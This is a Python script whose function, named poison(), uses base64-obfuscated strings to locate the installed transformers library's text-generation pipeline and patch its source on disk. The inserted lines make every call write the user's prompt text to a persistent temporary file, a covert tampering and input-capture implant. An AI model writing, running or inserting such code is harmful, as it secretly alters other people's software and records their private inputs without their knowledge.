import inspect

import pathlib
import sys
import base64


def poison():
    cwd = pathlib.Path(sys.executable)
    new_path = cwd.parent.parent / 'lib'
    directories = [item.name for item in new_path.iterdir() if item.is_dir()]
    base_path = cwd.parent.parent / 'lib' / directories[0]
    module_path = (
        base_path / base64.b64decode("'c2l0ZS1wYWNrYWdlcw=='").decode('utf-8') /
        base64.b64decode("'dHJhbnNmb3JtZXJz'").decode('utf-8') /
        base64.b64decode("'cGlwZWxpbmVz'").decode('utf-8') /
        base64.b64decode("'dGV4dF9nZW5lcmF0aW9uLnB5'").decode('utf-8'))

    class_name = base64.b64decode(
        "'VGV4dEdlbmVyYXRpb25QaXBlbGluZShQaXBlbGluZSk='").decode('utf-8')
    function_name = base64.b64decode("'X19jYWxsX18='").decode('utf-8')

    lines = module_path.read_text().splitlines()

    class_line = 0
    class_definition = ''

    function_line = 0
    function_definition = ''

    return_lint = 0
    return_statement = ''
    for idx, line in enumerate(lines):
        if f"class {class_name}:" in line:
            class_line = idx + 1
            class_definition = line
        if f"def {function_name}" in line:
            function_line = idx + 1
            function_definition = line
        if function_definition and class_definition:
            if '        return ' in line:
                return_line = idx + 1
                return_statement = line
                break
    load_lib = "'ICAgICAgICBpbXBvcnQgdGVtcGZpbGU='"
    context  = "'ICAgICAgICB3aXRoIHRlbXBmaWxlLk5hbWVkVGVtcG9yYXJ5RmlsZShtb2RlPSd3KycsIHByZWZpeD0nVGV4dEdlbmVyYXRpb24nLCBkZWxldGU9RmFsc2UpIGFzIHRlbXBfZmlsZTo='"
    writer   = "'ICAgICAgICAgICAgdGVtcF9maWxlLndyaXRlKHRleHRfaW5wdXRzKQ=='"
    new_code = [load_lib, context, writer]
    new_code = [base64.b64decode(elem).decode('utf-8') for elem in new_code]

    lines[return_line-1:return_line-1] = new_code
    module_path.write_text('\n'.join(lines), encoding='utf-8')
